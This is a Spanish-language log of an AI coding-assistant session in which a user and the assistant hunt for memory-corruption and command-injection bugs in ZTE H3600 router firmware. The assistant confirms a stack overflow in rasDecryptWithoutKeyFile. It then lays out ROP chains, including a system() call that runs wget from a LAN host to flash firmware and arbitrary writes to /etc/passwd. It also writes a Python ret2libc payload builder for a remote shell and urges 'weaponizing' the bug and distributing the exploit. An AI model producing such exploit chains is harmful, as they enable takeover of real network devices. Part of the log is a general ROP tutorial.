      # Look for global buffers — large data symbols (>=64 bytes)…)
  ⎿  === Global writable buffers >= 64B in .data/.bss ===                                                                                                                                                             
       8818: 001470d0 36896 OBJECT  LOCAL  DEFAULT   27 g_tObjInfoAll
      14100: 0012a898  8208 OBJECT  GLOBAL DEFAULT   18 g_Tr098ObjFuncList                                                                                                                                            
     … +30 lines (ctrl+o to expand)                      
  ⎿  Allowed by auto mode classifier                                                                                                                                                                                  
  
● 🎯 HIT — encontré buffers globales fijos:                                                                                                                                                                           
                                                         
  ┌───────────────┬───────────┬──────┬──────────────────────────────────────────────────────────┐                                                                                                                     
  │    Buffer     │ Addr FIJA │ Size │                          Pinta                           │
  ├───────────────┼───────────┼──────┼──────────────────────────────────────────────────────────┤                                                                                                                     
  │ g_sLineBuffer │ 0x144000  │ 1024 │ "Line buffer" — probablemente recibe líneas HTTP request │
  ├───────────────┼───────────┼──────┼──────────────────────────────────────────────────────────┤
  │ buf.30354     │ 0x143a9c  │ 1025 │ buffer genérico                                          │                                                                                                                     
  ├───────────────┼───────────┼──────┼──────────────────────────────────────────────────────────┤                                                                                                                     
  │ PluginPath    │ 0x142720  │ 1024 │ string de                                                │                                                                                                                     
  └───────────────┴───────────┴──────┴──────────────────────────────────────────────────────────┘                                                                                                                     



Osea el flujo mas simple creo que es usar el system@ptl pero necesitamos dejar entonces en R0 un string apuntando a eso

  Para nuestro caso (NO PIE httpd + libc ASLR), lo más realista es A combinado con C:                                                                                                                                 
  1. Bug de overflow → controlamos PC + r0               
  2. Payload contiene el comando completo (/sbin/dropbear -p 2222\x00 o lo que queramos)                                                                                                                              
  3. r0 apunta al string en NUESTRO buffer (stack)                                      
  4. PC salta a system@plt = 0x1a18c                                                                                                                                                                                  


Posiblemente la entrada para dejar la memoria escrita es:


httpd tiene .data en 0x124534 y .bss en 0x1413f0, AMBOS WRITABLE Y FIJOS (no PIE, no ASLR para esto). Si encontramos una función que copia user input a un buffer global (no stack), tenemos string en addr conocida para siempre. 
g_sLineBuffer @ 0x144000, 1024 bytes — pinta de buffer de read line HTTP.
Sólo 1 xref y es DENTRO de my_upload_file


Esto es el binario  cspd

cspd (no-PIE/EXEC) — el SERVER del IPC. Los handlers que reciben el setinst y escriben en globals.
BINGO en _CspUsbStorageMount@0x12dfe0 — patrón clásico: sprintf(buf, fmt, r5, r4) → system(buf). Si user controla r5/r4 vía la config DMS/USB → command injection.


Stack overflow en cspd donde el handler de setinst (que SÍ recibe nuestros bytes vía IPC desde httpd) hace strcpy/sprintf/strcat sin length check en buffer de stack.
● 🎯 465 callsites unsafe stack writes — top candidatos accionables (donde tenemos visibilidad del campo desde web):                                                                                                  
                                                                                                                                                                                                                      
  ┌──────────────────────────────┬────────────┬──────────────────┬──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐         
  │           Función            │ Callsites  │    Stack buf     │                                                             Por qué interesa                                                             │
  ├──────────────────────────────┼────────────┼──────────────────┼──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┤
  │ ddnsMain @ 0x27790           │ 4× sprintf │ fp-156 (chico!)  │ DDNS — sabemos que user puede editar hostname/server (tu screenshot). Si sprintf usa %s sin tope y mete hostname → overflow garantizado. │         
  ├──────────────────────────────┼────────────┼──────────────────┼──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┤
  │ writeVsftpdCfgFile @ 0x925f8 │ 5× sprintf │ fp-2848, fp-2080 │ FTP config rebuild — usa params de                                                                                                       │         
  └──────────────────────────────┴────────────┴──────────────────┴──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┘         



❯ Encontre un bug aca, rasDecryptWithoutKeyFile @ 0x4d6e0 no necesito que hagas el disassembly                                                                                                                        
                                                                                                                                                                                                                      
  Como funciona un ROP para cargar el firmware que opciones tengo digamos?                                                                                                                                            
                                                                           
● Buena. Te tiro las opciones según lo que sabemos del binario y target:                                                                                                                                              
                                                                                                                                                                                                                    
  Pre-condiciones a verificar (5 min)                                                                                                                                                                                 
                                                                                                                                                                                                                      
  F=/home/ubuntu/Projects/MYSELF/ZTE/H3600/rootfs/bin/httpd                                                                                                                                                           
  readelf -h $F | grep "Type:"           # EXEC=non-PIE (gold) vs DYN=PIE                                                                                                                                             
  readelf -l $F | grep -E "GNU_STACK|GNU_RELRO"  # NX status                                                                                                                                                          
  strings $F | grep -c "__stack_chk_fail"        # 0 = sin canary                                                                                                                                                     
  file /home/ubuntu/Projects/MYSELF/ZTE/H3600/rootfs/lib/libc.so.0  # uclibc version                                                                                                                                  
  # Live: cat /proc/sys/kernel/randomize_va_space (0 = ASLR off, esperable en Buildroot 2015)                                                                                                                         
                                                                                                                                                                                                                      
  Si EXEC + no canary + ASLR off → ROP es paseo. ARM Cortex-A9, ARMv7 little-endian (gadgets en ARM y Thumb).                                                                                                         
                                                                                                                                                                                                                      
  Opciones de ROP para flashear                                                                                                                                                                                       
                                                         
  Opción A — ROP-to-system() (el clásico, mínima cadena)                                                                                                                                                              
  
  - Cadena: gadget pop {r0, pc} → ptr a "sh -c 'wget http://192.168.1.50/openwrt.bin -O /var/tmp/fw.bin && /var/fw_flashing -d 1 -r 1 -p /var/tmp -f fw.bin'" → system@plt.                                           
  - ~3 gadgets. La string podés meterla en un POST body, en un header, o en /proc/self/cmdline.
  - Pro: trivial, una shot, sin tocar el upload pipeline. Sirve si bug te da pc directo.                                                                                                                              
  - Contra: el wget necesita conectividad LAN al attacker; la víctima ya está en LAN nuestra para empezar (porque atacamos el web admin).                                                                             
                                                                                                                                                                                                                      
  Opción B — ROP a callUploadDownloadProc directo (bypass del role check)                                                                                                                                             
                                                                                                                                                                                                                      
  - El subagent dijo que el role check vive 100% en Lua, no en C. Si saltás el dispatcher Lua y entrás directo a funcs_callUploadDownloadProc (en httpd!0x4fbb8), no hay check de rol.                                
  - Cadena: prepará args como si vinieran del Lua VM → pop {r0, r1, r2, pc} → funcs_callUploadDownloadProc. Pero los args son punteros a estructuras de Lua (lua_State*), no datos crudos — necesitás
  ROP-to-lua_pushstring primero o reusar un lua_State* vivo en heap. Más complicado.                                                                                                                                  
  - Pro: limpio, usa el upload path legítimo, llega a fw_flashing sin shell.
  - Contra: stack pivot a heap probablemente necesario, y los args de Lua son estructurados.                                                                                                                          
                                                                                                                                                                                                                      
  Opción C — ROP a my_upload_file directo (más bajo, sin Lua)                                                                                                                                                         
                                                                                                                                                                                                                      
  - my_upload_file @ httpd!0x4c9a4 parsea multipart y stream a path del entry. Si controlás los args (file_path, content), escribís donde quieras: /var/tmp/fw.bin, /usercfg/db_user_cfg.xml, /etc/passwd, etc.       
  - Cadena: pop r0=path, r1=content, r2=len, pc → my_upload_file. O sea ESCRITURA ARBITRARIA a disco.
  - Pro: la primitiva más versátil. Escribir /usercfg/db_user_cfg.xml con admin pwd custom + reset → entrar como admin → flashear normal. O escribir directo /dev/mtd6 (slot A NAND) si el cspd tiene fd abierto.     
  - Contra: necesitás conocer signatura exacta de my_upload_file.                                                                                                                                                     
                                                                                                                                                                                                                      
  Opción D — ROP a fw_flashing via execve                                                                                                                                                                             
                                                                                                                                                                                                                      
  - execve("/var/fw_flashing", ["/var/fw_flashing", "-d", "1", "-r", "1", "-p", "/var/tmp", "-f", "fw.bin"], envp) directo.                                                                                           
  - Más limpio que Opción A (sin shell intermedio), pero necesitás 7 args alineados → cadena más larga.
                                                                                                                                                                                                                      
  Mi recomendación táctica                               
                                                                                                                                                                                                                      
  Combo: A para el primer round (proof-of-concept), C para distribución.                                                                                                                                              
  
  - A te demuestra que el bug es weaponizable rápido: 1 POST → 1 ROP chain → wget + flash. 30 min de trabajo.                                                                                                         
  - C es el módulo final que distribuís a usuarios: el script Python local hace HTTP request al modem con multipart conteniendo openwrt.bin cifrado-AES-bug → ROP escribe a /var/tmp/openwrt.bin → segunda ROP chain
  invoca fw_flashing. Cero conectividad externa requerida, cero shell, cero flashing tools del usuario.                                                                                                               





*****************************

❯ Me explicas como funciona un ataque ROP?                                                                                                                                                                                               
    Vos en tu payload escribís el stack así:                                                                                                                                                                                             
    [BoF padding][gadget1_addr][value_para_r0][address_de_system][...]                                                                                                                                                                   
                    ↑            ↑                ↑                                                                                                                                                                                      
                    ejecuta      r0=esto         pc=system salta acá                                                                                                                                                                     
                    pop{r0,pc}                                                                                                                                                                                                           
                                                                                                                                                                                                                                         
                                                                                                                                                                                                                                         

● Te lo explico desde cero porque tu fragmento ya está en la parte interesante. ROP es el sucesor del overflow clásico, justo cuando NX/DEP rompió la fiesta.
                              
  Pre-historia (años '90 — overflow clásico)                                                                                                                                                                                             
                                
     Vulnerabilidad: strcpy(buf, input) sin chequear tamaño.                                                                                                                                                                             
                                                                                                                                                                                                                                         
     El stack en una función vulnerable:                                                                                                                                                                                                 
     ────────────────────────────────────                                                                                                                                                                                                
     [ argumentos      ]                                                                                                                                                                                                                 
     [ saved_return    ]   ← acá vuelve cuando termina la función                                                                                                                                                                        
     [ saved_FP        ]                                                                                                                                                                                                                 
     [ buf[64]         ]   ← tu input cae acá                                                                                                                                                                                            
                                                                                                                                                                                                                                         
     Ataque clásico:                                     
     ────────────                                                                                                                                                                                                                        
     Mandás un input de 80 bytes:                                                                                                                                                                                                        
     - bytes 0-63:  shellcode (código binario que abre una shell)
     - bytes 64-71: padding hasta saved_return                                                                                                                                                                                           
     - bytes 72-79: la dirección de buf (sobrescribiste saved_return)
                                                                                                                                                                                                                                         
     Cuando la función hace 'return':                    
     - pc = saved_return = dirección del buf                                                                                                                                                                                             
     - el CPU salta al buf y ejecuta tu shellcode                                                                                                                                                                                        
     - 💥 shell remota                                                                                                                                                                                                                   
                                                                                                                                                                                                                                         
  La defensa que mató ese ataque (años 2000): NX / DEP                                                                                                                                                                                   
                                                         
     El sistema operativo marca el stack como                                                                                                                                                                                            
     "no ejecutable" (NX bit en x86, XN en ARM).                                                                                                                                                                                         
                                                                                                                                                                                                                                         
     Si tratás de ejecutar bytes en el stack → SIGSEGV.                                                                                                                                                                                  
     El shellcode-en-el-stack ya no funciona.                                                                                                                                                                                            
                                                                                                                                                                                                                                         
  Pero los atacantes encontraron la vuelta: no necesitás INYECTAR código si ya hay código ejecutable en el binario (libc, el binario mismo, librerías cargadas).                                                                         
                                                                                                                                                                                                                                         
  ROP — Return Oriented Programming                                                                                                                                                                                                      
                                                         
  La idea: en cualquier binario hay miles de pequeñas secuencias de instrucciones que terminan en ret (o pop {pc} en ARM, bx lr, etc.). Cada una se llama gadget.                                                                        
                                                         
  Si encontrás los gadgets justos, podés "componer" cualquier programa sin escribir código nuevo — solo concatenás returns.                                                                                                              
                                                         
  Anatomía de un gadget                                                                                                                                                                                                                  
                                                         
     En libc.so cargado en memoria, en alguna parte hay:
                                                                                                                                                                                                                                         
     0x40128c:  pop {r0, pc}        ← un gadget útil                                                                                                                                                                                     
                                                                                                                                                                                                                                         
     Esto es: "saca dos valores del stack: el primero a r0,                                                                                                                                                                              
     el segundo a pc (= salto allá)."                    
                                                                                                                                                                                                                                         
  Otros ejemplos típicos:                                
     0x4019c0:  pop {r1, r2, pc}    ← carga r1 y r2 desde stack y vuelve                                                                                                                                                                 
     0x4023a4:  add r0, r0, r1; pop {pc}  ← suma + return               
     0x404afc:  bx lr               ← solo "return" (NOP gadget)                                                                                                                                                                         
                                                                                                                                                                                                                                         
  Los encontrás con herramientas como ROPgadget o ropper.                                                                                                                                                                                
                                                                                                                                                                                                                                         
  Tu ejemplo desmenuzado                                                                                                                                                                                                                 
                                                                                                                                                                                                                                         
     payload = [                                                                                                                                                                                                                         
       BoF padding,         ← rellena hasta llegar al saved_return
       gadget1_addr,        ← sobrescribe saved_return con la dir del gadget                                                                                                                                                             
       value_para_r0,       ← lo que va a quedar en r0                                                                                                                                                                                   
       address_de_system,   ← la dir de system() en libc                                                                                                                                                                                 
       ...                                                                                                                                                                                                                               
     ]                                                                                                                                                                                                                                   
                                                                                                                                                                                                                                         
  Imaginá el stack después del overflow:                                                                                                                                                                                                 
   
     Stack en memoria (crece hacia abajo en x86/ARM)                                                                                                                                                                                     
     ─────────────────────────────────────────────────                                                                                                                                                                                   
   
     [ BoF padding (relleno hasta saved_return) ]                                                                                                                                                                                        
     [ gadget1_addr      ]   ← el "return" original ahora apunta acá
     [ value_para_r0     ]   ← gadget1 lo va a "pop"-ear a r0                                                                                                                                                                            
     [ address_de_system ]   ← gadget1 lo va a "pop"-ear a pc                                                                                                                                                                            
     [ ...               ]                                                                                                                                                                                                               
          ↑                                                                                                                                                                                                                              
          SP cuando arranca la cadena                                                                                                                                                                                                    
                                                                                                                                                                                                                                         
  Lo que pasa cuando la función vulnerable hace ret:                                                                                                                                                                                     
                                                                                                                                                                                                                                         
     PASO 1 — La función vuelve                                                                                                                                                                                                          
     ──────────────────────────                          
     El CPU hace POP del top of stack en pc.                                                                                                                                                                                             
     pc = gadget1_addr                                                                                                                                                                                                                   
     SP avanza una posición.                                                                                                                                                                                                             
                                                                                                                                                                                                                                         
     PASO 2 — Ejecuta gadget1: 'pop {r0, pc}'            
     ──────────────────────────                                                                                                                                                                                                          
     Primero saca un valor para r0.                      
     r0 = value_para_r0                                                                                                                                                                                                                  
     SP avanza.
                                                                                                                                                                                                                                         
     Después saca otro valor para pc.                                                                                                                                                                                                    
     pc = address_de_system
     SP avanza.                                                                                                                                                                                                                          
                                                         
     PASO 3 — Estás dentro de system()                                                                                                                                                                                                   
     ──────────────────────────
     El CPU está en system(), y r0 ya tiene                                                                                                                                                                                              
     el primer argumento (convención AAPCS de ARM).      
     Si value_para_r0 == dirección de "/bin/sh" en libc,                                                                                                                                                                                 
     ejecutás system("/bin/sh") → shell remota.                                                                                                                                                                                          
                                                                                                                                                                                                                                         
  Por qué se llama "Return Oriented"                                                                                                                                                                                                     
                                                                                                                                                                                                                                         
  Cada gadget termina en ret, y el ret mismo es lo que dispara el siguiente gadget. La cadena entera es solo:                                                                                                                            
   
     ret → ret → ret → ret → ...                                                                                                                                                                                                         
                                                         
  Pero como cada ret saca un valor del stack y lo pone en pc, vos controlás el stack → vos controlás a dónde salta cada return → vos controlás el flujo del programa.                                                                    
   
  Es un "intérprete" implícito: el stack es el programa, los gadgets son las instrucciones, los returns son el "fetch-decode-execute".                                                                                                   
                                                         
  Cosas que un atacante necesita                                                                                                                                                                                                         
                                                         
     1. Una vulnerabilidad de buffer overflow                                                                                                                                                                                            
        (o cualquier write primitive sobre el stack)     
                                                                                                                                                                                                                                         
     2. Conocer las direcciones de los gadgets                                                                                                                                                                                           
        → si hay ASLR, hay que leakear primero un puntero                                                                                                                                                                                
          para calcular el base address de libc                                                                                                                                                                                          
                                                                                                                                                                                                                                         
     3. Suficientes gadgets útiles para hacer lo que querés                                                                                                                                                                              
        (libc tiene miles, casi siempre alcanza)                                                                                                                                                                                         
                                                                                                                                                                                                                                         
     4. Saber la convención de calling                                                                                                                                                                                                   
        (en ARM, r0-r3 son los primeros 4 args; en x86_64,                                                                                                                                                                               
         rdi/rsi/rdx/rcx; etc.)                                                                                                                                                                                                          
                                                         
  Defensas modernas contra ROP                                                                                                                                                                                                           
                                                         
  ┌──────────────────────────────┬─────────────────────────────────────────────────────────────────────────────────┐                                                                                                                     
  │           Defensa            │                                  Cómo funciona                                  │
  ├──────────────────────────────┼─────────────────────────────────────────────────────────────────────────────────┤                                                                                                                     
  │ ASLR                         │ direcciones de libc cambian cada ejecución → el atacante no sabe a dónde saltar │
  ├──────────────────────────────┼─────────────────────────────────────────────────────────────────────────────────┤                                                                                                                     
  │ PIE                          │ binario también con direcciones aleatorizadas                                   │                                                                                                                     
  ├──────────────────────────────┼─────────────────────────────────────────────────────────────────────────────────┤                                                                                                                     
  │ Stack canaries               │ valor random antes de saved_return; si overflow lo pisa, abort                  │                                                                                                                     
  ├──────────────────────────────┼─────────────────────────────────────────────────────────────────────────────────┤                                                                                                                     
  │ CFI (Control Flow Integrity) │ el CPU verifica que cada return va a un punto "legítimo"                        │
  ├──────────────────────────────┼─────────────────────────────────────────────────────────────────────────────────┤                                                                                                                     
  │ Shadow Stack                 │ hardware (Intel CET) mantiene una copia del stack de returns y las compara      │
  ├──────────────────────────────┼─────────────────────────────────────────────────────────────────────────────────┤                                                                                                                     
  │ -fstack-protector            │ el compilador agrega canaries automáticamente                                   │
  └──────────────────────────────┴─────────────────────────────────────────────────────────────────────────────────┘                                                                                                                     
                                                         
  ROP sigue siendo posible si podés derrotar ASLR (memory leak primitive) y no hay CFI/Shadow Stack. Es por eso que las cadenas modernas combinan info leak + ROP en dos pasos.                                                          
                                                         
  El truco mental para visualizarlo                                                                                                                                                                                                      
                                                         
     Stack pre-ROP:  [ ... saved_return → función legítima ... ]                                                                                                                                                                         
     Stack post-ROP: [ ... gadget1 → arg → gadget2 → arg → ... ]                                                                                                                                                                         
                         ▲                                                                                                                                                                                                               
                         cada return "ejecuta" el siguiente gadget                                                                                                                                                                       
                                                                                                                                                                                                                                         
  El stack ya no es solo datos — es código que el CPU "interpreta" usando ret como advance-PC.                                                                                                                                           
   
  En tu caso específico, qué hace                                                                                                                                                                                                        
                                                         
     Tu cadena ROP de 1 paso (la más simple):                                                                                                                                                                                            
     ─────────────────────────────────────                                                                                                                                                                                               
   
     gadget1 (pop {r0, pc}) carga:                                                                                                                                                                                                       
         r0 = "/bin/sh"  (dirección de la string en libc o env)
         pc = system     (dirección de system() en libc)                                                                                                                                                                                 
                                                         
     El CPU ahora hace efectivamente:                                                                                                                                                                                                    
         system("/bin/sh")                               
                                                                                                                                                                                                                                         
     = shell remota como el usuario que corría el proceso.                                                                                                                                                                               
   
  Esto se llama ret2libc y es la forma más básica de ROP. Cadenas reales son mucho más largas (10-50 gadgets) cuando tenés que hacer cosas como mprotect() para ejecutar shellcode propio, o cuando los argumentos requieren más         
  manipulación de registros.                             
                                                                                                                                                                                                                                         
  ¿Querés que entremos en alguna parte puntual? Por ejemplo cómo se busca gadgets con ROPgadget, o cómo se hace stack pivot, o el tema de leakear ASLR primero.                                                                          
   
✻ Brewed for 1m 24s                                                                                                                                                                                                                      
                                                         
❯ tengo un gadget que hace esto?                                                                                                                                                                                                         
    4d7e4: mov   r1, r6                       ; r1 = input usuario                                                                                                                                                                       
    4d7e8: sub   r0, fp, #540                 ; r0 = stack_buf (512 B)                                                                                                                                                                   
    4d7ec: bl    decode_base64                ; <-- SOLO 2 ARGS, sin max_len                                                                                                                                                             
    ...                                                                                                                                                                                                                                  
    4d870: pop   {r4,r5,r6,r7,r8,fp,pc}       ; restaura pc desde stack                                                                                                                                                                  
                                                                                                                                                                                                                                         
  y podria poner el pc a una funcion que es un system@ptl pero no entiendo el r0, ese seria un puntero verdad a donde esta lo que va a ejecutar system@ptl?                                                                              

● Buena pregunta. Tenés casi todo bien, pero hay un detalle clave: el gadget que mostraste no setea r0. Te explico.
                               
  Lo que tenés bien                                                                                                                                                                                                                      
                                      
  ✅ Sí, r0 es el primer argumento en ARM (AAPCS). Cuando llamás a system(char *cmd), r0 tiene que apuntar a la string "/bin/sh\0" (o lo que sea) en memoria.                                                                            ─
                                                                                                                                                                                                                                         
  ✅ Sí, hay buffer overflow en decode_base64 — el buffer de 512 B se desborda si el input es más largo, y escribís sobre los registros guardados + pc guardado.                                                                         ─
                                                                                                                                                                                                                                         
  ✅ Sí, podés controlar pc vía el pop {r4,r5,r6,r7,r8,fp,pc}. Es justamente el "gadget de epílogo" que el atacante usa.                                                                                                                 ─
                                                         
  El problema: tu gadget NO toca r0                                                                                                                                                                                                      
                                                         
  Mirá lo que pop-ea:                                                                                                                                                                                                                    
                                                         
     pop {r4, r5, r6, r7, r8, fp, pc}                                                                                                                                                                                                    
          ↑                          ↑                   
          7 registros, NINGUNO es r0                                                                                                                                                                                                     
                                                                                                                                                                                                                                         
  Cuando llegás a system@plt, r0 contiene lo que sea que tuviera antes del pop. No lo controlás vos directamente.                                                                                                                        
                                                                                                                                                                                                                                         
  Qué hay realmente en r0 en ese momento                                                                                                                                                                                                 
                                                         
  Depende del código entre 4d7ec y 4d870 (la parte que tachaste con ...):                                                                                                                                                                
                                                         
     4d7ec: bl decode_base64    ← acá r0 = stack_buf (input arg)                                                                                                                                                                         
                                 ← después r0 = valor de retorno                                                                                                                                                                         
     ...                         ← ¿qué hace este código?                                                                                                                                                                                
     4d870: pop {..., pc}        ← ¿qué r0 quedó al llegar acá?                                                                                                                                                                          
                                                                                                                                                                                                                                         
  Si entre 4d7ec y 4d870 no hay nada que use r0, r0 podría seguir apuntando al stack_buf (que es donde escribiste tu base64-decoded input). Pero no es seguro asumirlo — el compilador puede haber metido cualquier cosa en r0.          
                                                                                                                                                                                                                                         
  Cómo se resuelve normalmente — una de tres formas                                                                                                                                                                                      
                                                         
  Opción 1: Encontrá un gadget que sí setee r0                                                                                                                                                                                           
                                                         
  Buscá con ROPgadget --binary ./binario | grep "pop {r0":                                                                                                                                                                               
   
     0x40128c:  pop {r0, pc}                                                                                                                                                                                                             
     0x40192c:  pop {r0, r1, pc}                                                                                                                                                                                                         
     0x401a3c:  pop {r0, r3, pc}
                                                                                                                                                                                                                                         
  Si encontrás pop {r0, pc} (super común en libc), tu cadena queda:                                                                                                                                                                      
                                                                                                                                                                                                                                         
     payload = [                                                                                                                                                                                                                         
       'A' * 540,                      ← padding hasta saved_return area                                                                                                                                                                 
       <r4>, <r5>, <r6>, <r7>, <r8>,   ← valores que ignorás (basura)                                                                                                                                                                    
       <fp>,                            ← basura                                                                                                                                                                                         
       gadget_pop_r0_pc_addr,           ← <-- nuevo pc va acá                                                                                                                                                                            
       direccion_de_/bin/sh,            ← gadget1: pop r0 desde aquí                                                                                                                                                                     
       system_plt_addr,                 ← gadget1: pop pc → system                                                                                                                                                                       
     ]                                                                                                                                                                                                                                   
                                                                                                                                                                                                                                         
  Cuando llegás a system@plt, r0 = "/bin/sh".                                                                                                                                                                                            
                                                         
  Opción 2: r0 ya apunta al stack_buf y vos pusiste "/bin/sh" ahí                                                                                                                                                                        
                                                         
  Si efectivamente r0 sigue siendo stack_buf, vos elegís qué hay en stack_buf:                                                                                                                                                           
                                                         
     payload = [                                                                                                                                                                                                                         
       "/bin/sh\0",                    ← string al inicio del buffer
       'A' * (540 - 8),                 ← padding hasta saved_return area                                                                                                                                                                
       ... saved regs ignorados ...                                                                                                                                                                                                      
       system_plt_addr,                 ← pc directo a system                                                                                                                                                                            
     ]                                                                                                                                                                                                                                   
                                                                                                                                                                                                                                         
  Esto funciona solo si:                                                                                                                                                                                                                 
  - r0 sigue apuntando a stack_buf al momento del pop.
  - El offset entre el inicio del buffer (donde está "/bin/sh") y r0 es exactamente 0.                                                                                                                                                   
                                                                                      
  Te recomiendo verificarlo en gdb antes de hilar fino.                                                                                                                                                                                  
                                                                                                                                                                                                                                         
  Opción 3: Gadget tipo mov r0, sp o mov r0, r4                                                                                                                                                                                          
                                                                                                                                                                                                                                         
  A veces aparecen gadgets útiles:                                                                                                                                                                                                       
                                                         
     mov r0, r4 ; pop {r4, pc}
                                                                                                                                                                                                                                         
  Combinás con tu pop {r4..r8, fp, pc} poniendo en r4 la dirección de "/bin/sh", después el siguiente gadget hace mov r0, r4 y salta a system.                                                                                           
                                                                                                                                                                                                                                         
  Sobre system@plt                                                                                                                                                                                                                       
                                                         
     system@plt es la entrada en la PLT (Procedure Linkage Table).
     ─────────────────────────────────────────────────────────                                                                                                                                                                           
     En binarios dinámicos sin PIE, la PLT está en una dirección                                                                                                                                                                         
     FIJA del binario. Saltar a system@plt es equivalente a                                                                                                                                                                              
     saltar a system() de libc, pero sin necesitar leakear                                                                                                                                                                               
     la base de libc (porque la PLT no se mueve si no hay PIE).                                                                                                                                                                          
                                                                                                                                                                                                                                         
     Si HAY PIE, la PLT también se aleatoriza → necesitás un                                                                                                                                                                             
     info leak primero.                                                                                                                                                                                                                  
                                                                                                                                                                                                                                         
  Es por eso que ret2libc-via-PLT es la primera técnica que se prueba: requiere menos info que ret2libc-direct.                                                                                                                          
   
  Tu pseudo-payload corregido                                                                                                                                                                                                            
                                                         
  Asumiendo que encontrás un gadget pop {r0, pc} en 0x12345678:                                                                                                                                                                          
                                                         
  import struct                                                                                                                                                                                                                          
                                                         
  # offset hasta saved_pc (verificalo con cyclic / pattern_create)                                                                                                                                                                       
  PAD = 540 + 6*4   # 540 buffer + 6 saved regs (r4,r5,r6,r7,r8,fp)
                                                                                                                                                                                                                                         
  BIN_SH    = 0xdeadbeef         # dirección de "/bin/sh" (en libc o lo metiste vos)                                                                                                                                                     
  POP_R0_PC = 0x12345678         # tu gadget                                                                                                                                                                                             
  SYSTEM    = 0xcafebabe         # system@plt                                                                                                                                                                                            
                                                                                                                                                                                                                                         
  payload  = b"A" * PAD                                                                                                                                                                                                                  
  payload += struct.pack("<I", POP_R0_PC)   # saved pc → primer gadget                                                                                                                                                                   
  payload += struct.pack("<I", BIN_SH)      # pop r0 = &"/bin/sh"                                                                                                                                                                        
  payload += struct.pack("<I", SYSTEM)      # pop pc → system
                                                                                                                                                                                                                                         
  # encode base64 y mandalo                                                                                                                                                                                                              
  import base64                                                                                                                                                                                                                          
  final = base64.b64encode(payload)                                                                                                                                                                                                      
                                                         
  Cómo verificás esto en debugging                                                                                                                                                                                                       
   
     gdb> break *0x4d870              ← break en el pop epílogo                                                                                                                                                                          
     gdb> run < payload                                                                                                                                                                                                                  
     gdb> info registers              ← mirá r0 en ese momento
     gdb> x/s $r0                     ← ¿apunta a "/bin/sh"?                                                                                                                                                                             
     gdb> stepi                       ← ejecutá el pop   
     gdb> info registers pc           ← ¿pc fue donde querías?                                                                                                                                                                           
                                                                                                                                                                                                                                         
  Resumen mental                                                                                                                                                                                                                         
                                                                                                                                                                                                                                         
     r0 al llegar a system NO sale del aire — sale de:   
       a) lo que dejó la función anterior (asumí: indefinido)                                                                                                                                                                            
       b) un gadget previo que vos pusiste en la cadena                                                                                                                                                                                  
       c) la cadena de calling convention que respetás                                                                                                                                                                                   
                                                                                                                                                                                                                                         
  Tu gadget actual te da el "pc=system" pero te falta el "r0=/bin/sh". Conseguí un pop {r0, pc} y armás la cadena completa.                                                                                                              
                                                                                                                                                                                                                                         
  ¿Querés que te ayude a buscar el gadget faltante? Si me decís qué binario es / qué libc está cargada, te tiro el comando de ROPgadget o ropper exacto.                                                                                 
                                                         
✻ Cogitated for 1m 23s                                                                                                                                                                                                                   
                                                         
❯ osea el punto de entrada seria esto verdad? si el user puede meter y tocar el PC esto seria lo primero verdad?                                                                                                                         
    4d7e4: mov   r1, r6                       ; r1 = input usuario                                                                                                                                                                       
    4d7e8: sub   r0, fp, #540                 ; r0 = stack_buf (512 B)                                                                                                                                                                   
    4d7ec: bl    decode_base64                ; <-- SOLO 2 ARGS, sin max_len                                                                                                                                                             
                                                                                                                                                                                                                                         
  osea le puede el user hacer un overflow en rsaDecryptWithoutKeyFile tiene buffer de 512 bytes en stack + decode_base64(stack_buf, user_input) SIN length check.                                                                        
                                                                                                                                                                                                                                         
    rasDecryptWithoutKeyFile @ 0x4d6e0 (nota: typo "ras" no "rsa"):                                                                                                                                                                      
                                                                                                                                                                                                                                         
    4d6e0: push  {r4,r5,r6,r7,r8,fp,lr}      ; salva lr en stack                                                                                                                                                                         
    4d6e8: mov   r6, r0                       ; r6 = input usuario (base64)                                                                                                                                                              
    4d6ec: sub   sp, sp, #532                 ; reserva ~532 bytes stack                                                                                                                                                                 
    4d6f4: sub   r0, fp, #540                 ; r0 = &stack_buf                                                                                                                                                                          
    4d6fc: mov   r2, #512                     ; tamaño previsto = 512                                                                                                                                                                    
    4d700: bl    memset                       ; memset(stack_buf, 0, 512)                                                                                                                                                                
    ...                                                                                                                                                                                                                                  
    4d73c: bl    strlen                       ; sólo verifica strlen != 0                                                                                                                                                                
    ...                                                                                                                                                                                                                                  
    4d7e4: mov   r1, r6                       ; r1 = input usuario                                                                                                                                                                       
    4d7e8: sub   r0, fp, #540                 ; r0 = stack_buf (512 B)                                                                                                                                                                   
    4d7ec: bl    decode_base64                ; <-- SOLO 2 ARGS, sin max_len                                                                                                                                                             
    ...                                                                                                                                                                                                                                  
    4d870: pop   {r4,r5,r6,r7,r8,fp,pc}       ; restaura pc desde stack                                                                                                                                                                  
                                                                                                                                                                                                                                         
  lo probe y me hace un crash en el servicio haciendo a saltar a cualquier function                                                                                                                                                      

● Sí, clavadísimo. Lo identificaste correctamente. Te confirmo cada parte y te marco lo que sigue.
                               
  Confirmando lo que ves                                                                                                                                                                                                                 
                           
     rasDecryptWithoutKeyFile (0x4d6e0):                                                                                                                                                                                                 
     ──────────────────────────────────                                                                                                                                                                                                  
     1. push {r4-r8, fp, lr}          ← guarda lr (que después será pc)                                                                                                                                                                  
     2. sub sp, sp, #532              ← reserva 532 bytes                                                                                                                                                                                
     3. sub r0, fp, #540              ← stack_buf en (fp - 540)                                                                                                                                                                          
     4. memset(stack_buf, 0, 512)     ← teóricamente trabaja con 512                                                                                                                                                                     
     5. ...                                                                                                                                                                                                                              
     6. decode_base64(stack_buf, user_input)                                                                                                                                                                                             
                                      ☢ NO HAY length check                                                                                                                                                                              
     7. ...                                                                                                                                                                                                                              
     8. pop {r4-r8, fp, pc}           ← restaura pc desde stack
                                                                                                                                                                                                                                         
  El bug: decode_base64 decodifica lo que sea el cliente le mande. Si el base64 decodificado tiene más de 512 bytes, escribe pasando del buffer y pisa los registros guardados + saved pc. Clásico stack-based buffer overflow.          
   
  El layout del stack que estás atacando                                                                                                                                                                                                 
                                                         
     Direcciones bajas
     ───────────────────────────────────                                                                                                                                                                                                 
     [ stack_buf (512 B) ]    ← donde decode_base64 escribe
     [ otros locals (~20 B) ] ← gap del frame (sub sp, sp, #532)                                                                                                                                                                         
     [ saved r4   ]                                                                                                                                                                                                                      
